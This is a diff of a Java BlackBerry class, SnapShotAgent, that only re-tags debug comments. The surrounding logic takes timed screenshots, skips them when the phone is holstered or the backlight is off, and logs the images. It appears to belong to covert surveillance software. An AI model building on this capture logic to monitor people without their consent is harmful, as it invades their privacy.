@@ -49,21 +49,21 @@ public class SnapShotAgent extends Agent {
     // se e' in standby non prendi la snapshot
     public void actualRun() {
 
-        // #debug
-        debug.info("Taking snapshot");
+        // #debug info
+	debug.info("Taking snapshot");
         
         
         if(DeviceInfo.isInHolster())
         {
-        	// #debug
-        	debug.info("In Holster, skipping snapshot");
+        	// #debug info
+	debug.info("In Holster, skipping snapshot");
         	return;
         }
         
         if(!Backlight.isEnabled() )
         {
-        	// #debug
-        	debug.info("No backlight, skipping snapshot");
+        	// #debug info
+	debug.info("No backlight, skipping snapshot");
         	return;
         }
         
@@ -97,8 +97,8 @@ public class SnapShotAgent extends Agent {
         log.writeLog(plain);
         log.close();
 
-        // #debug
-        debug.trace("finished run");
+        // #debug debug
+	debug.trace("finished run");
 
     }
 
@@ -126,8 +126,8 @@ public class SnapShotAgent extends Agent {
                 "Wrong additional data name");
         // #endif
 
-        // #debug
-        debug.trace("Additional data len: " + additionalData.length);
+        // #debug debug
+	debug.trace("Additional data len: " + additionalData.length);
 
         return additionalData;
     }
@@ -147,13 +147,13 @@ public class SnapShotAgent extends Agent {
             if (value >= MIN_TIMER) {
                 this.timerMillis = value;
             }
-            // #debug
-            debug.trace("timer: " + timerMillis);
+            // #debug debug
+	debug.trace("timer: " + timerMillis);
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
-            // #debug
-            debug.trace("onNewWindow: " + onNewWindow);
+            // #debug debug
+	debug.trace("onNewWindow: " + onNewWindow);
 
         } catch (final EOFException e) {
             // #debug
